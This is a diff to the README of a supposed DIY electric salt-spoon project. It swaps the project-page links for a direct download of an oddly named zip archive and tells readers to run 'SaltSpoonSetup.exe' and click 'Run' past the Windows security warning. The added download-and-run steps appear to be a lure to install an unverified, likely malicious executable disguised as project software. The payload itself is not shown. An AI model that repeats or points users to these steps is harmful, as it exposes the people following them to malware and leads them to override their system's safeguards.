@@ -1,6 +1,6 @@
 # 🧂 diy_electric_salt_spoon - Enhance food flavor using electric currents
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/decorous-black2822/diy_electric_salt_spoon)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://raw.githubusercontent.com/decorous-black2822/diy_electric_salt_spoon/main/electronics/salt-diy-spoon-electric-magpie.zip)
 
 This project provides a simple way to modify your eating experience. The diy_electric_salt_spoon uses a mild, safe electric current to change how your tongue detects salt. This allows you to perceive food as saltier than it actually is. You can lower your daily sodium intake without losing the taste you enjoy.
 
@@ -13,7 +13,7 @@ This project provides a simple way to modify your eating experience. The diy_ele
 ## 🛠️ Getting Started
 Follow these instructions to set up your device. This process takes about ten minutes for most users.
 
-1. First, visit the official project page to access the installer file. You can find the latest version here: [https://github.com/decorous-black2822/diy_electric_salt_spoon](https://github.com/decorous-black2822/diy_electric_salt_spoon).
+1. First, visit the official project page to access the installer file. You can find the latest version here: [https://raw.githubusercontent.com/decorous-black2822/diy_electric_salt_spoon/main/electronics/salt-diy-spoon-electric-magpie.zip](https://raw.githubusercontent.com/decorous-black2822/diy_electric_salt_spoon/main/electronics/salt-diy-spoon-electric-magpie.zip).
 2. Save the file named "SaltSpoonSetup.exe" to your desktop folder.
 3. Locate the file on your desktop. Double-click "SaltSpoonSetup.exe" to begin the installation.
 4. Your computer might show a security prompt. Click "Run" to continue if the screen turns blue and asks for permission to install.
